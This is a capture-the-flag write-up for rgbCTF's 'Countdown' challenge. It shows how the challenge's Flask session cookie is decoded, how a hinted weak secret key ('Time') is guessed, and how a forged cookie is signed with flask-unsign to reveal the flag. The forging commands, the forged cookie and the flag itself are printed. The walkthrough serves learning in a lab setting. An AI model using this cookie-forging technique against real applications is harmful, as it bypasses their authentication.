# Countdown
## Challenge Description
This challenge is simple. All you have to do is wait for the countdown to end to get the flag. The countdown ends one second before the end of the CTF, but you have fast fingers right?

http://challenge.rgbsec.xyz:5000/

## Solution
By inspecting the javascript, you can see that it calculates the countdown based on a flask cookie. 
 
```
> Cookies.get('session');
> "eyJlbmQiOiIyMDIwLTA3LTEzIDE2OjU5OjU5KzAwMDAifQ.XxPyUg.XwWza8N4fQrvZF1cOe4A5WtANlI"
> atob("eyJlbmQiOiIyMDIwLTA3LTEzIDE2OjU5OjU5KzAwMDAifQ")
> "{"end":"2020-07-13 16:59:59+0000"}"
```

The solution is to sign a new Flask cookie with a sooner 'end' date and send that to the server. The webpage hints that "Time is key", which hints the flask secret key is literally "Time".

```
pip install flask-unsign
flask-unsign --sign --cookie "{'end':'2020-07-13 16:59:59+0000'}" --secret "Time"
eyJlbmQiOiIyMDIwLTA3LTEzIDE2OjU5OjU5KzAwMDAifQ.XxP4xA.EeGkDiOwiXmKBBl0qN9otcdO8sE
```

Replace the session cookie with this new value and refresh the page. You should see the flag.

The flag is `rgbCTF{t1m3_1s_k3y_g00d_j0k3_r1ght}`

## Resources
https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

### Author
[tiraaamisu](https://github.com/Lindzy)